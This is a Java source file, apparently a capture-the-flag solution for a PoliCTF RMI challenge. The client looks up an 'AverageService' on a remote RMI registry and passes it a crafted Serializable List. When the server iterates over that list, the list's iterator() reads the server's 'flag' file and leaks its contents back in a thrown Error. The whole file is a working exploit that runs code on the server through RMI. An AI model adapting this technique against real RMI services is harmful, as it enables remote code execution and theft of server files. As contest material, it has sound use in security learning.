package it.polictf.lamermi;

import java.io.Serializable;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.*;

/**
 * Created by vigliag on 2/13/16.
 */
public class Client {
    public static void main(String[] args) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry("lamermi.chall.polictf.it", 1099);
        System.out.println("registry found");
        AverageService averageService = (AverageService) registry.lookup("AverageService");
        System.out.println("average service found");
        List<Integer> l = new myList<>();
        l.add(4);
        l.add(3);
        l.add(7);
        System.out.println("sending exploit");
        Double result = averageService.average(l);
        System.out.println(result);
    }
}


class myList<E> implements List<E>, Serializable {
    public static final long serialVersionUID = 42L;
    @Override
    public ListIterator<E> listIterator(final int var1){
        throw new Error("Hi");
    }
    @Override
    public List<E> subList(int i, int i1) {
        return null;
    }
    @Override
    public int size() {
        return 0;
    }
    @Override
    public boolean isEmpty() {
        return false;
    }
    @Override
    public boolean contains(Object o) {
        return false;
    }
    @Override
    public Iterator<E> iterator() {
        try{
            String content = new String(Files.readAllBytes(Paths.get("flag")));
            throw new Error(content);
        } catch (Exception e) {
            throw new Error(e);
        }
    }
    @Override
    public Object[] toArray() {
        return new Object[0];
    }
    @Override
    public <T> T[] toArray(T[] ts) {
        return null;
    }
    @Override
    public boolean add(E e) {
        return false;
    }
    @Override
    public boolean remove(Object o) {
        return false;
    }
    @Override
    public boolean containsAll(Collection<?> collection) {
        return false;
    }
    @Override
    public boolean addAll(Collection<? extends E> collection) {
        return false;
    }
    @Override
    public boolean addAll(int i, Collection<? extends E> collection) {
        return false;
    }
    @Override
    public boolean removeAll(Collection<?> collection) {
        return false;
    }
    @Override
    public boolean retainAll(Collection<?> collection) {
        return false;
    }
    @Override
    public void clear() { }
    @Override
    public E get(int i){
        System.out.println("hi");
        return null;
    }
    @Override
    public E set(int i, E e) {
        return null;
    }
    @Override
    public void add(int i, E e) {
    }
    @Override
    public E remove(int i) {
        return null;
    }
    @Override
    public int indexOf(Object o) {
        return 0;
    }
    @Override
    public int lastIndexOf(Object o) {
        return 0;
    }
    @Override
    public ListIterator<E> listIterator() {
        return null;
    }
}